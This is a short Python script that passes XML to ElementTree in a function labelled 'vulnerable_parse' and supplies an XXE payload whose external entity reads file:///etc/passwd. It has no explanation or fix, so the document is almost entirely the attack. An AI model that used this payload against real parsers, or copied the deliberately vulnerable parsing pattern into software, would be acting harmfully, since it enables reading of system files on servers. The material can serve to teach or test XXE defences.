import xml.etree.ElementTree as ET

def vulnerable_parse(xml_string):
    return ET.fromstring(xml_string)

xml_data = """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <element>&xxe;</element>
</root>"""

vulnerable_xml = vulnerable_parse(xml_data)
print(vulnerable_xml)